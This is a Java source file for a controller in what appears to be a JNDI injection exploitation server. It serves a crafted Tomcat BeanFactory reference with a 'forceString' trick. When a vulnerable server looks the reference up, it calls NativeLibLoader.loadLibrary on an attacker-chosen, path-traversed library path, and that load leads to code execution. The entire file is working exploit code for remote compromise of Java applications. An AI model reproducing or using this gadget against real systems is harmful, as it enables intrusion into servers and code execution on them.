package map.jndi.controller;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.util.MiscUtil;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/NativeLibLoader")
public class NativeLibLoaderController implements Controller {
    public Object process(String path) {
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../" + path));
        return ref;
    }

    @JNDIMapping("/{path}")
    public String loadLibrary(String path) {
        path = MiscUtil.tryBase64UrlDecode(path);
        System.out.println("[NativeLibLoader] Library Path: " + path);
        return path;
    }
}
